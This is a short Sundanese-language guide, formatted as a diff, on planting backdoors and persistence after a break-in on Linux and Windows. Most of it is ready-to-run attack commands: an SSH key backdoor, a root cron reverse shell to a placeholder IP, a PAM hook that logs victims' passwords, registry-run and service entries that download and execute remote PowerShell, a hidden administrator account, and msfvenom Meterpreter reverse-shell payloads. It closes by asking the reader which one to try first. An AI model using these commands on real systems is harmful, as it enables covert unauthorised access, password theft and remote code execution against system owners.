@@ -1,0 +1,62 @@
+🔹 Maintaining Access: Masang Backdoor & Persistence
+
+Maintaining access téh bagian penting dina Red Teaming supaya sanajan sistem target diperbaiki, urang masih bisa akses deui tanpa kudu ngulang exploit. Ieu sababaraha cara pikeun masang backdoor & persistence di Linux jeung Windows.
+🔸 A. Masang SSH Backdoor
+Lamun geus meunang akses root, urang bisa masang SSH Key Backdoor pikeun login tanpa password.
+
+mkdir -p ~/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+
+🎯 Efekna: Bisa login deui via SSH tanpa kudu exploit deui.
+
+🔸 B. Cronjob Backdoor (Persistent Access)
+
+Ngadamel job otomatis nu balikan shell tiap menit:
+
+echo "* * * * * root bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" >> /etc/crontab
+
+🎯 Efekna: Muka reverse shell otomatis ka server anjeun tiap menit.
+
+🔸 C. PAM Backdoor (Intercept Passwords)
+
+echo 'auth required pam_exec.so expose_authtok /usr/bin/logger' >> /etc/pam.d/common-auth
+
+🎯 Efekna: Bakal log sakabéh password nu diasupkeun korban.
+
+2️⃣ Windows: Masang Backdoor & Persistence
+
+Masang reverse shell anu otomatis jalan pas Windows dihurungkeun:
+
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Backdoor" /t REG_SZ /d "powershell -c iex(New-Object Net.WebClient).DownloadString('http://YOUR_SERVER/payload.ps1')" /f
+
+🎯 Efekna: Payload bakal dieksekusi otomatis tiap Windows dihurungkeun.
+
+net user hiddenadmin P@ssw0rd /add
+net localgroup Administrators hiddenadmin /add
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hiddenadmin /t REG_DWORD /d 0 /f
+🔸 C. Masang Service Backdoor
+Nyieun service anu otomatis mawa reverse shell:
+
+sc create backdoor_service binPath= "C:\Windows\System32\cmd.exe /c powershell -c 'iex(New-Object Net.WebClient).DownloadString(\"http://YOUR_SERVER/shell.ps1\")'"
+sc start backdoor_service
+3️⃣ Metasploit Backdoor (Linux & Windows)
+Kalawan Metasploit, urang bisa nyieun backdoor nu otomatis persist.
+
+🔸 A. Linux Meterpreter Persistent Backdoor
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f elf > backdoor.elf
+chmod +x backdoor.elf
+./backdoor.elf
+🎯 Efekna: Bakal muka sesi Meterpreter.
+🔸 B. Windows Meterpreter Persistent Backdoor
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe > backdoor.exe
+✅ SSH Key Backdoor → Bisa login deui tanpa password.
+✅ Cronjob / Task Scheduler → Muka shell otomatis.
+✅ Hidden Admin Account → Nyieun akun admin sumput.
+✅ Registry / Service Backdoor → Persisten dina Windows.
+✅ Metasploit Payload → Bisa digunakeun ka Linux & Windows.
+
+🚀 Rék nyobaan nu mana heula, Mang? 😎🔥
